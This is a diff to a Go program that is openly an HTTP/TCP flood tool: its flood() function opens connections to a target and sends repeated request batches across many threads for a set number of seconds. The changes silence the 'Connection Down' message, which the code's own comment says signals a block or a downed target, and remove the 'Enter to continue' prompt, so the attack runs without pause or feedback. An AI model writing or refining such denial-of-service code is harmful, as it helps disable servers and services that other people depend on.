@@ -197,7 +197,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			// fmt.Println("Connection Down!!!") When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -263,7 +263,6 @@ func main() {
 	} else {
 		key = "&"
 	}
-	input := bufio.NewReader(os.Stdin)
 
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
@@ -271,12 +270,6 @@ func main() {
 		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
-	}
-	fmt.Printf("\nPlease [Enter] for continue")
-	_, err = input.ReadString('\n')
-	if err != nil {
-		fmt.Println(err)
-		return
 	}
 	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
 	close(start)
